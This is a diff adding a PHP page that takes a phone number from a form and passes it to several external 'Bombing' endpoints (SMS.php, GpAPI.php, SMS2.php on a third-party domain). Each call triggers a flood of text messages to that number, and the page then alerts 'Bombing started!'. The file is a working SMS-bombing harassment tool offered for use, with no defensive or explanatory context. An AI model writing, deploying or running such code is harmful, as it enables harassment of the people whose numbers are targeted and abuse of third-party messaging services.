@@ -1,0 +1,33 @@
+<?php
+// Prevent zooming and enhance security headers
+header('X-Content-Type-Options: nosniff');
+header('Content-Security-Policy: default-src \'self\'');
+header('Strict-Transport-Security: max-age=31536000; includeSubDomains');
+
+// Collect the number input from the form
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    if (isset($_POST['start'])) {
+        $number = $_POST['number'];
+        $apis = [
+            "https://3xmonsters.my.id/Bombing/SMS.php?number=",
+            "https://3xmonsters.my.id/Bombing/GpAPI.php?number=",
+            "https://3xmonsters.my.id/Bombing/SMS2.php?number=",
+            // Add more APIs here...
+        ];
+
+        // Loop through each API and send the request
+        foreach ($apis as $api) {
+            file_get_contents($api . urlencode($number));  // Trigger each API call
+        }
+
+        echo "<script>alert('Bombing started!');</script>";
+    }
+
+    if (isset($_POST['stop'])) {
+        // Code to stop bombing (if applicable, typically requires backend control over each request)
+        echo "<script>alert('Bombing stopped!');</script>";
+    }
+}
+?>
+
+<!-- HTML part of the page will be above -->
